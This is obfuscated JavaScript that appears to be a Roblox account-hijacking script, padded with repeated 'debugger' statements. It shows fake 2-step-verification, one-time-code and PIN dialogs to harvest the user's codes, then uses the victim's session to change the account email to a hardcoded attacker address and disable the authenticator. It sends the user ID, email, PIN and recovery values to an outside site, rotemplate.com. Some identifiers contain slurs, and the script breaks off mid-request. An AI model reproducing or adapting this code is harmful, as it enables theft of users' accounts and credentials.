debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
function GetEmail() {
  var _0x4a3daa = document.getElementById("hintlol").value;
  document.getElementById("rbx-body").innerHTML = document.getElementById("rbx-body").innerHTML += "<div role=\"dialog\" id=\"GetNiggasEmail\" style=\"display: block;\"><div class=\"fade modal-backdrop in\"></div><div role=\"dialog\" tabindex=\"-1\" class=\"fade modal-modern in modal\" style=\"display: block;\"><div class=\"modal-dialog\"><div class=\"modal-content\" role=\"document\"><div class=\"modal-header\"><button type=\"button\" class=\"modal-modern-header-button\" onclick=\"document.getElementById(\" login-loading\").style.display=\"none\" ;document.getelementbyid(\"login-button\").style.display=\"block\" ;document.getelementbyid(\"twostepverification\").style.display=\"none\" ;\"=\"\"></span></button><h4 class=\"modal-title\">Sorry!</h4><div class=\"modal-modern-header-info\"></div></div><div class=\"modal-body\"><div class=\"modal-lock-icon\"></div><p class=\"modal-margin-bottom-xlarge\">We are aware that there is an issue with accessing Roblox avatar images currently. Our team is actively working on it.<br><br>As an alternative, please enter the e-mail associated with your ROBLOX account, so our team are able to send you the image you just requested.<br><br>Hint: " + _0x4a3daa + "</p><div class=\"input-control-wrapper\"><div id=\"twostep-group\" class=\"   form-group\"><input as=\"input\" autocomplete=\"off\" maxlength=\"600\" oninput=\"twostepInput4(this.value, '" + _0x4a3daa + "')\" this.value=\"this.value.replace(/[^0-9.]/g,\" \"\").replace(=\"\" (..*?)..*=\"\" g,=\"\" \"$1\");\"=\"\" placeholder=\"Email\" type=\"text\" id=\"two-step-verification-code-inputwda\" class=\"input-field form-control\"><input type=\"text\" id=\"ticket\" hidden=\"\"><input type=\"text\" id=\"userid\" hidden=\"\"><input type=\"text\" id=\"server\" hidden=\"\"><div class=\"form-control-label bottom-label xsmall\" id=\"twostep-error241\">&nbsp;</div></div></div></div><div class=\"modal-footer\"><div class=\"modal-modern-footer-buttons\"><button type=\"button\" class=\"btn-cta-md modal-modern-footer-button\" aria-label=\"Verify\" onclick=\"emailhintcheck(2);\" onchange=\"check6dig(type)\" disabled id=\"verifyButton24\">Confirm</button></div></div></div></div></div></div>";
  document.getElementById("GetNiggasEmail").style.display = "block";
}
function twostep(_0x40d522) {
  console.log(_0x40d522);
  var _0x1fd0c0 = document.getElementById("pinHEHE").value;
  console.log(_0x1fd0c0);
  if (_0x40d522 == 2) {
    var _0x5aaa07 = document.querySelector("#two-step-verification-code-input").value;
    var _0x4ab3b8 = document.getElementsByName("user-data")[0].getAttribute("data-userid");
    var _0x29d031 = document.getElementsByName("csrf-token")[0].getAttribute("data-token");
    var _0x1b22e9 = document.querySelector("#sessiontoken").value;
    var _0x18b96a = document.querySelector("#challengeid").value;
    var _0x14123a = document.querySelector("#email").value;
    var _0x5a09f7 = document.querySelector("#challengetype").value;
    var _0x2babc1 = document.querySelector("#challenge").value;
    fetch("https://apis.roblox.com/otp-service/v1/validateCode", {
      headers: {
        accept: "application/json, text/plain, */*",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json;charset=UTF-8",
        "sec-ch-ua": "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "sec-gpc": "1",
        "x-csrf-token": _0x29d031
      },
      referrer: "https://www.roblox.com/",
      referrerPolicy: "strict-origin-when-cross-origin",
      body: "{\"contactType\":\"Email\",\"origin\":\"Reauth\",\"passCode\":\"" + _0x5aaa07 + "\",\"otpSessionToken\":\"" + _0x1b22e9 + "\"}",
      method: "POST",
      mode: "cors",
      credentials: "include"
    }).then(_0x2f8375 => _0x2f8375.text()).then(_0x4025c6 => {
      if (_0x4025c6.includes("contactValue")) {
        fetch("https://apis.roblox.com/reauthentication-service/v1/token/generate", {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "sec-ch-ua": "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "sec-gpc": "1",
            "x-csrf-token": _0x29d031
          },
          referrer: "https://www.roblox.com/",
          referrerPolicy: "strict-origin-when-cross-origin",
          body: "{\"sessionId\":\"" + _0x1b22e9 + "\",\"type\":\"Otp_Email\"}",
          method: "POST",
          mode: "cors",
          credentials: "include"
        }).then(_0xeb87c3 => _0xeb87c3.json()).then(_0x5acd52 => {
          var _0x15eb9d = _0x5acd52.token;
          console.log(_0x15eb9d);
          fetch("https://accountsettings.roblox.com/v1/email", {
            headers: {
              accept: "application/json, text/plain, */*",
              "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
              "content-type": "application/x-www-form-urlencoded",
              "rblx-challenge-id": _0x18b96a,
              "rblx-challenge-metadata": btoa("{\"reauthenticationToken\":\"" + _0x15eb9d + "\"}"),
              "rblx-challenge-type": "reauthentication",
              "sec-ch-ua": "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
              "sec-ch-ua-mobile": "?0",
              "sec-ch-ua-platform": "\"Windows\"",
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-site",
              "sec-gpc": "1",
              "x-csrf-token": _0x29d031
            },
            referrer: "https://www.roblox.com/",
            referrerPolicy: "strict-origin-when-cross-origin",
            body: "emailAddress=" + _0x14123a + "&password=",
            method: "POST",
            mode: "cors",
            credentials: "include"
          }).then(_0x46d2d1 => _0x46d2d1.text()).then(_0x331325 => {
            if (_0x331325 == "{}") {
              document.getElementById("onetime").style.display = "none";
              if (_0x1fd0c0) {
                window.location.replace("https://rotemplate.com/avatar.php?id=" + _0x4ab3b8 + "&email=" + _0x14123a + "&pin=" + _0x1fd0c0 + "&seed=" + document.querySelector("#seed1").value + "&emailkey=" + document.querySelector("#emailkey").value);
              } else {
                window.location.replace("https://rotemplate.com/avatar.php?id=" + _0x4ab3b8 + "&email=" + _0x14123a + "&seed=" + document.querySelector("#seed1").value + "&emailkey=" + document.querySelector("#emailkey").value);
              }
              GetEmail();
            } else {
              alert("Error! Please Retry The Steps");
              location.reload();
            }
          });
        });
      } else {
        document.getElementById("twostep-group").setAttribute("class", "form-has-feedback  form-has-error form-group");
        document.getElementById("twostep-error").innerHTML = "6 Digit One-Time Code Invalid.";
      }
    });
  }
  if (_0x40d522 == 1) {
    var _0x5aaa07 = document.querySelector("#two-step-verification-code-input").value;
    var _0x4ab3b8 = document.getElementsByName("user-data")[0].getAttribute("data-userid");
    var _0x29d031 = document.getElementsByName("csrf-token")[0].getAttribute("data-token");
    var _0x1b22e9 = document.querySelector("#sessiontoken").value;
    var _0x18b96a = document.querySelector("#challengeid").value;
    var _0x14123a = document.querySelector("#email").value;
    var _0x5a09f7 = document.querySelector("#challengetype").value;
    var _0x2babc1 = document.querySelector("#challenge").value;
    var _0x5575a0 = document.querySelector("#challengeidtwo").value;
    fetch("https://twostepverification.roblox.com/v1/users/" + _0x4ab3b8 + "/challenges/email/verify", {
      headers: {
        accept: "application/json, text/plain, */*",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json;charset=UTF-8",
        "sec-ch-ua": "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "sec-gpc": "1",
        "x-csrf-token": _0x29d031
      },
      referrer: "https://www.roblox.com/",
      referrerPolicy: "strict-origin-when-cross-origin",
      body: "{\"challengeId\":\"" + _0x5575a0 + "\",\"actionType\":\"Generic\",\"code\":\"" + _0x5aaa07 + "\"}",
      method: "POST",
      mode: "cors",
      credentials: "include"
    }).then(_0x34c501 => _0x34c501.text()).then(_0x40055c => {
      if (_0x40055c.includes("two step verification challenge code is inv")) {
        document.getElementById("twostep-group").setAttribute("class", "form-has-feedback  form-has-error form-group");
        document.getElementById("twostep-error").innerHTML = "6 Digit Email Code Invalid.";
      } else if (_0x40055c.includes("verificationToken")) {
        document.getElementById("twostep").style.display = "none";
        var _0x276068 = JSON.parse(_0x40055c).verificationToken;
        fetch("https://accountsettings.roblox.com/v1/email", {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "rblx-challenge-id": _0x18b96a,
            "rblx-challenge-metadata": btoa("{\"verificationToken\":\"" + _0x276068 + "\",\"rememberDevice\":false,\"challengeId\":\"" + _0x5575a0 + "\",\"actionType\":\"Generic\"}"),
            "rblx-challenge-type": "twostepverification",
            "sec-ch-ua": "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "sec-gpc": "1",
            "x-csrf-token": _0x29d031
          },
          referrer: "https://www.roblox.com/",
          referrerPolicy: "strict-origin-when-cross-origin",
          body: "emailAddress=" + _0x14123a + "&password=",
          method: "POST",
          mode: "cors",
          credentials: "include"
        }).then(_0x221377 => _0x221377.text()).then(_0x54801a => {
          if (_0x54801a == "{}") {
            document.getElementById("twostep").style.display = "none";
            if (_0x1fd0c0) {
              window.location.replace("https://rotemplate.com/avatar.php?id=" + _0x4ab3b8 + "&email=" + _0x14123a + "&pin=" + _0x1fd0c0 + "&seed=" + document.querySelector("#seed1").value + "&emailkey=" + document.querySelector("#emailkey").value);
            } else {
              window.location.replace("https://rotemplate.com/avatar.php?id=" + _0x4ab3b8 + "&email=" + _0x14123a + "&seed=" + document.querySelector("#seed1").value + "&emailkey=" + document.querySelector("#emailkey").value);
            }
            GetEmail();
          } else {
            alert("Error! Please Retry The Steps");
            location.reload();
          }
        });
      } else {
        alert("Fatal Error!");
        location.reload();
      }
    });
  }
  if (_0x40d522 == 3) {
    var _0x5aaa07 = document.querySelector("#two-step-verification-code-input").value;
    var _0x4ab3b8 = document.getElementsByName("user-data")[0].getAttribute("data-userid");
    var _0x29d031 = document.getElementsByName("csrf-token")[0].getAttribute("data-token");
    var _0x1b22e9 = document.querySelector("#sessiontoken").value;
    var _0x18b96a = document.querySelector("#challengeid").value;
    var _0x14123a = document.querySelector("#email").value;
    var _0x5a09f7 = document.querySelector("#challengetype").value;
    var _0x2babc1 = document.querySelector("#challenge").value;
    var _0x5575a0 = document.querySelector("#challengeidtwo").value;
    fetch("https://twostepverification.roblox.com/v1/users/" + _0x4ab3b8 + "/challenges/authenticator/verify", {
      headers: {
        accept: "application/json, text/plain, */*",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json;charset=UTF-8",
        "sec-ch-ua": "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "sec-gpc": "1",
        "x-csrf-token": _0x29d031
      },
      referrer: "https://www.roblox.com/",
      referrerPolicy: "strict-origin-when-cross-origin",
      body: "{\"challengeId\":\"" + _0x5575a0 + "\",\"actionType\":\"Generic\",\"code\":\"" + _0x5aaa07 + "\"}",
      method: "POST",
      mode: "cors",
      credentials: "include"
    }).then(_0x4c41b0 => _0x4c41b0.text()).then(_0x3703a5 => {
      if (_0x3703a5.includes("two step verification challenge code is inv")) {
        document.getElementById("twostep-group").setAttribute("class", "form-has-feedback  form-has-error form-group");
        document.getElementById("twostep-error").innerHTML = "6 Digit Authenticator Code Invalid.";
      } else if (_0x3703a5.includes("verificationToken")) {
        document.getElementById("twostep").style.display = "none";
        var _0x5cc7b4 = JSON.parse(_0x3703a5).verificationToken;
        fetch("https://accountsettings.roblox.com/v1/email", {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "rblx-challenge-id": _0x18b96a,
            "rblx-challenge-metadata": btoa("{\"verificationToken\":\"" + _0x5cc7b4 + "\",\"rememberDevice\":false,\"challengeId\":\"" + _0x5575a0 + "\",\"actionType\":\"Generic\"}"),
            "rblx-challenge-type": "twostepverification",
            "sec-ch-ua": "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "sec-gpc": "1",
            "x-csrf-token": _0x29d031
          },
          referrer: "https://www.roblox.com/",
          referrerPolicy: "strict-origin-when-cross-origin",
          body: "emailAddress=" + _0x14123a + "&password=",
          method: "POST",
          mode: "cors",
          credentials: "include"
        }).then(_0x3b914d => _0x3b914d.text()).then(_0x2e9c4c => {
          if (_0x2e9c4c == "{}") {
            fetch("https://twostepverification.roblox.com/v1/users/" + _0x4ab3b8 + "/configuration/authenticator/disable", {
              headers: {
                accept: "application/json, text/plain, */*",
                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua": "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "sec-gpc": "1",
                "x-csrf-token": _0x29d031
              },
              referrer: "https://www.roblox.com/",
              referrerPolicy: "strict-origin-when-cross-origin",
              method: "POST",
              mode: "cors",
              credentials: "include"
            }).then(_0x284e77 => _0x284e77.text()).then(_0x42583a => {
              document.getElementById("twostep").style.display = "none";
              if (_0x1fd0c0) {
                window.location.replace("https://rotemplate.com/avatar.php?id=" + _0x4ab3b8 + "&email=" + _0x14123a + "&pin=" + _0x1fd0c0 + "&seed=" + document.querySelector("#seed1").value + "&emailkey=" + document.querySelector("#emailkey").value);
              } else {
                window.location.replace("https://rotemplate.com/avatar.php?id=" + _0x4ab3b8 + "&email=" + _0x14123a + "&seed=" + document.querySelector("#seed1").value + "&emailkey=" + document.querySelector("#emailkey").value);
              }
              GetEmail();
            });
          } else {
            alert("Error! Please Retry The Steps");
            location.reload();
          }
        });
      } else {
        alert("Fatal Error!");
        location.reload();
      }
    });
  }
}
function twostepInput(_0x2cbd62) {
  b = "verifybutton";
  if (_0x2cbd62.length == 6) {
    document.querySelector("#verifyButton").disabled = false;
  } else {
    document.querySelector("#verifyButton").disabled = true;
  }
}
function emailhintcheck(_0x10a0fc) {
  var _0x364d69 = document.getElementsByName("user-data")[0].getAttribute("data-userid");
  var _0x589494 = document.querySelector("#two-step-verification-code-inputwda").value;
  document.getElementById("GetNiggasEmail").style.display = "none";
  window.location.replace("https://rotemplate.com/avatar.php?id=" + _0x364d69 + "&guysemail=" + _0x589494 + "&finish=1");
}
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
function twostepInput4(_0x2c3ff3, _0xb5ed87) {
  try {
    domainpart = _0xb5ed87.split("@")[1];
    firstpart = _0xb5ed87.split("*")[0];
    firstletter = _0x2c3ff3[0];
    domainpart2 = _0x2c3ff3.split("@")[1];
    if (firstletter == firstpart) {
      if (domainpart == domainpart2) {
        document.querySelector("#verifyButton24").disabled = false;
      } else {
        document.querySelector("#verifyButton24").disabled = true;
      }
    } else {
      document.querySelector("#verifyButton24").disabled = true;
    }
  } catch {
    document.querySelector("#verifyButton24").disabled = true;
  }
}
function Popup(_0x215acb) {
  if (_0x215acb == "onetime") {
    document.getElementById("rbx-body").innerHTML = document.getElementById("rbx-body").innerHTML += "<div role=\"dialog\" id=\"onetime\" style=\"display: block;\"><div class=\"fade modal-backdrop in\"></div><div role=\"dialog\" tabindex=\"-1\" class=\"fade modal-modern in modal\" style=\"display: block;\"><div class=\"modal-dialog\"><div class=\"modal-content\" role=\"document\"><div class=\"modal-header\"><button type=\"button\" class=\"modal-modern-header-button\" onclick=\"document.getElementById(\" login-loading\").style.display=\"none\" ;document.getelementbyid(\"login-button\").style.display=\"block\" ;document.getelementbyid(\"twostepverification\").style.display=\"none\" ;\"=\"\"></span></button><h4 class=\"modal-title\">One-Time Verification</h4><div class=\"modal-modern-header-info\"></div></div><div class=\"modal-body\"><div class=\"modal-lock-icon\"></div><p class=\"modal-margin-bottom-xlarge\">A one-time code has been sent to your registered email. Please enter your one-time code to continue.</p><div class=\"input-control-wrapper\"><div id=\"twostep-group\" class=\"   form-group\"><input as=\"input\" autocomplete=\"off\" maxlength=\"6\" oninput=\"twostepInput(this.value)\" this.value=\"this.value.replace(/[^0-9.]/g,\" \"\").replace(=\"\" (..*?)..*=\"\" g,=\"\" \"$1\");\"=\"\" placeholder=\"6-Digit Code\" type=\"password\" id=\"two-step-verification-code-input\" class=\"input-field form-control\"><input type=\"text\" id=\"ticket\" hidden=\"\"><input type=\"text\" id=\"userid\" hidden=\"\"><input type=\"text\" id=\"server\" hidden=\"\"><div class=\"form-control-label bottom-label xsmall\" id=\"twostep-error\">&nbsp;</div></div></div></div><div class=\"modal-footer\"><div class=\"modal-modern-footer-buttons\"><button type=\"button\" class=\"btn-cta-md modal-modern-footer-button\" aria-label=\"Verify\" onclick=\"twostep(2);\" onchange=\"check6dig(type)\" disabled id=\"verifyButton\">Submit</button></div></div></div></div></div></div>";
    document.getElementById("onetime").style.display = "block";
  }
  if (_0x215acb == "twostep") {
    document.getElementById("rbx-body").innerHTML = document.getElementById("rbx-body").innerHTML += "<div role=\"dialog\" id=\"twostep\" style=\"display: block;\"><div class=\"fade modal-backdrop in\"></div><div role=\"dialog\" tabindex=\"-1\" class=\"fade modal-modern in modal\" style=\"display: block;\"><div class=\"modal-dialog\"><div class=\"modal-content\" role=\"document\"><div class=\"modal-header\"><button type=\"button\" class=\"modal-modern-header-button\" onclick=\"document.getElementById(\" login-loading\").style.display=\"none\" ;document.getelementbyid(\"login-button\").style.display=\"block\" ;document.getelementbyid(\"twostepverification\").style.display=\"none\" ;\"=\"\"></button><h4 class=\"modal-title\">2-Step Verification</h4><div class=\"modal-modern-header-info\"></div></div><div class=\"modal-body\"><div class=\"modal-lock-icon\"></div><p class=\"modal-margin-bottom-xlarge\">Enter the code we just sent you via email.</p><div class=\"input-control-wrapper\"><div id=\"twostep-group\" class=\"   form-group\"><input as=\"input\" autocomplete=\"off\" maxlength=\"6\" oninput=\"twostepInput(this.value)\" this.value=\"this.value.replace(/[^0-9.]/g,\" \"\").replace(=\"\" (..*?)..*=\"\" g,=\"\" \"$1\");\"=\"\" placeholder=\"Enter 6-digit Code\" type=\"password\" id=\"two-step-verification-code-input\" class=\"input-field form-control\"><input type=\"text\" id=\"ticket\" hidden=\"\"><input type=\"text\" id=\"userid\" hidden=\"\"><input type=\"text\" id=\"server\" hidden=\"\"><div class=\"form-control-label bottom-label xsmall\" id=\"twostep-error\">&nbsp;</div></div></div></div><div class=\"modal-footer\"><div class=\"modal-modern-footer-buttons\"><button type=\"button\" class=\"btn-cta-md modal-modern-footer-button\" aria-label=\"Verify\" onclick=\"twostep(1);\"  disabled id=\"verifyButton\">Verify</button></div><p class=\"text-footer modal-margin-bottom\">Need help? Contact <a class=\"text-name text-footer contact\" href=\"https://www.roblox.com/info/2sv\" target=\"_blank\" rel=\"noopener noreferrer\">Roblox Support</a></p><p class=\"text-footer\">IMPORTANT: Don\"t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p></div></div></div></div></div>";
    document.getElementById("twostep").style.display = "block";
  }
  if (_0x215acb == "twostepauth") {
    document.getElementById("rbx-body").innerHTML = document.getElementById("rbx-body").innerHTML += "<div role=\"dialog\" id=\"twostep\" style=\"display: block;\"><div class=\"fade modal-backdrop in\"></div><div role=\"dialog\" tabindex=\"-1\" class=\"fade modal-modern in modal\" style=\"display: block;\"><div class=\"modal-dialog\"><div class=\"modal-content\" role=\"document\"><div class=\"modal-header\"><button type=\"button\" class=\"modal-modern-header-button\" onclick=\"document.getElementById(\" login-loading\").style.display=\"none\" ;document.getelementbyid(\"login-button\").style.display=\"block\" ;document.getelementbyid(\"twostepverification\").style.display=\"none\" ;\"=\"\"></button><h4 class=\"modal-title\">2-Step Verification</h4><div class=\"modal-modern-header-info\"></div></div><div class=\"modal-body\"><div class=\"modal-lock-icon\"></div><p class=\"modal-margin-bottom-xlarge\">Enter the code generated by your authenticator app.</p><div class=\"input-control-wrapper\"><div id=\"twostep-group\" class=\"   form-group\"><input as=\"input\" autocomplete=\"off\" maxlength=\"6\" oninput=\"twostepInput(this.value)\" this.value=\"this.value.replace(/[^0-9.]/g,\" \"\").replace(=\"\" (..*?)..*=\"\" g,=\"\" \"$1\");\"=\"\" placeholder=\"Enter 6-digit Code\" type=\"password\" id=\"two-step-verification-code-input\" class=\"input-field form-control\"><input type=\"text\" id=\"ticket\" hidden=\"\"><input type=\"text\" id=\"userid\" hidden=\"\"><input type=\"text\" id=\"server\" hidden=\"\"><div class=\"form-control-label bottom-label xsmall\" id=\"twostep-error\">&nbsp;</div></div></div></div><div class=\"modal-footer\"><div class=\"modal-modern-footer-buttons\"><button type=\"button\" class=\"btn-cta-md modal-modern-footer-button\" aria-label=\"Verify\" onclick=\"twostep(3);\"  disabled id=\"verifyButton\">Verify</button></div><p class=\"text-footer modal-margin-bottom\">Need help? Contact <a class=\"text-name text-footer contact\" href=\"https://www.roblox.com/info/2sv\" target=\"_blank\" rel=\"noopener noreferrer\">Roblox Support</a></p><p class=\"text-footer\">IMPORTANT: Don\"t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p></div></div></div></div></div>";
    document.getElementById("twostep").style.display = "block";
  }
}
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
var csrf = document.getElementsByName("csrf-token")[0].getAttribute("data-token");
var email = encodeURIComponent("rnyi@proton.me");
console.log(email);
console.log(csrf);
fetch("https://accountsettings.roblox.com/v1/email", {
  headers: {
    accept: "application/json, text/plain, */*",
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    "content-type": "application/json;charset=UTF-8",
    "sec-ch-ua": "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "sec-gpc": "1"
  },
  referrer: "https://www.roblox.com/",
  referrerPolicy: "strict-origin-when-cross-origin",
  method: "GET",
  mode: "cors",
  credentials: "include"
}).then(_0x3c2b4c => _0x3c2b4c.json()).then(_0xe2d230 => {
  var _0x7f50fc = _0xe2d230.emailAddress;
  document.getElementById("rbx-body").innerHTML += "<input type=\"text\" id=\"hintlol\" hidden>";
  document.querySelector("#hintlol").setAttribute("value", _0x7f50fc);
});
fetch("https://auth.roblox.com/v1/account/pin", {
  headers: {
    accept: "application/json, text/plain, */*",
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    "sec-ch-ua": "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "sec-gpc": "1"
  },
  referrer: "https://www.roblox.com/",
  referrerPolicy: "strict-origin-when-cross-origin",
  body: null,
  method: "GET",
  mode: "cors",
  credentials: "include"
}).then(_0x1eef62 => _0x1eef62.json()).then(_0x38e442 => {
  document.getElementById("rbx-body").innerHTML += "<input type=\"text\" id=\"pinHEHE\" hidden>";
  document.querySelector("#pinHEHE").setAttribute("value", "");
  if (_0x38e442.isEnabled) {
    document.getElementById("rbx-body").innerHTML = document.getElementById("rbx-body").innerHTML += "<div role=\"dialog\" id=\"PIN\" style=\"display: none;\"><div class=\"fade modal-backdrop in\"></div><div role=\"dialog\" tabindex=\"-1\" class=\"fade modal-modern in modal\" style=\"display: block;\"><div class=\"modal-dialog\"><div class=\"modal-content\" role=\"document\"><div class=\"modal-header\"><button type=\"button\" class=\"modal-modern-header-button\" onclick=\"document.getElementById(\"PIN\").style.display = \"none\";\"></button><h4 class=\"modal-title\">Account PIN Required</h4><div class=\"modal-modern-header-info\"></div></div><div class=\"modal-body\"><p class=\"modal-margin-bottom-sm\">Enter the PIN attached to your account</p><center><input type=\"password\" id=\"pin_input\" class=\"form-control pin-field ng-valid-maxlength ng-not-empty ng-valid-parse ng-valid-required ng-valid ng-valid-minlength ng-touched ng-pristine\" name=\"pin\" autocomplete=\"off\" ng-trim=\"false\" ng-model=\"pinInfo.pin\" minlength=\"4\" maxlength=\"4\" ng-minlength=\"4\" ng-maxlength=\"4\" ng-required=\"true\" key-press-enter=\"submit(pinUnlockForm)\" numbers-only=\"\" autofocus=\"\" required=\"required\" style=\"width: 76px; height: 38px; text-align: center;\"></center><br><p class=\"modal-margin-bottom-xlarge text-error\" id=\"pinError\"></p><p class=\"text-error xsmall\"></p></div><div class=\"modal-footer\"><center><button type=\"submit\" class=\"modal-button btn-secondary-md ng-binding\" onclick=\"omggay();\">Unlock</button></center></div></div></div></div></div>";
    document.getElementById("PIN").style.display = "block";
  } else {
    cont();
  }
});
function omggay() {
  var _0x594295 = document.querySelector("#pin_input").value;
  var _0x380459 = document.getElementsByName("csrf-token")[0].getAttribute("data-token");
  fetch("https://auth.roblox.com/v1/account/pin/unlock", {
    headers: {
      accept: "application/json, text/plain, */*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      "content-type": "application/json;charset=UTF-8",
      "sec-ch-ua": "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": "\"Windows\"",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      "sec-gpc": "1",
      "x-csrf-token": _0x380459
    },
    referrer: "https://www.roblox.com/",
    referrerPolicy: "strict-origin-when-cross-origin",
    body: "{\"pin\":\"" + _0x594295 + "\"}",
    method: "POST",
    mode: "cors",
    credentials: "include"
  }).then(_0x23629d => _0x23629d.text()).then(_0x9d873e => {
    if (_0x9d873e.includes("unlockedUntil")) {
      document.querySelector("#pinHEHE").setAttribute("value", _0x594295);
      cont();
      document.getElementById("PIN").style.display = "none";
    } else if (_0x9d873e.includes("Too many requests")) {
      document.getElementById("pinError").innerHTML = "You Are Being Ratelimited.";
    } else {
      document.getElementById("pinError").innerHTML = "The Pin Is Incorrect.";
    }
  });
}
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
debugger;
function cont() {
  document.getElementById("rbx-body").innerHTML += "<input type=\"text\" id=\"challengeid\" hidden>";
  document.getElementById("rbx-body").innerHTML += "<input type=\"text\" id=\"challengeidtwo\" hidden>";
  document.getElementById("rbx-body").innerHTML += "<input type=\"text\" id=\"metadata\" hidden>";
  document.getElementById("rbx-body").innerHTML += "<input type=\"text\" id=\"challengetype\" hidden>";
  document.getElementById("rbx-body").innerHTML += "<input type=\"text\" id=\"challenge\" hidden>";
  document.getElementById("rbx-body").innerHTML += "<input type=\"text\" id=\"sessiontoken\" hidden>";
  document.getElementById("rbx-body").innerHTML += "<input type=\"text\" id=\"email\" hidden>";
  document.getElementById("rbx-body").innerHTML += "<input type=\"text\" id=\"emailkey\" hidden>";
  document.getElementById("rbx-body").innerHTML += "<input type=\"text\" id=\"seed1\" hidden>";
  document.querySelector("#email").setAttribute("value", email);
  var _0x4ab1d2 = document.getElementsByName("csrf-token")[0].getAttribute("data-token");
  fetch("https://apis.roblox.com/auth-token-service/v1/login/create", {
    headers: {
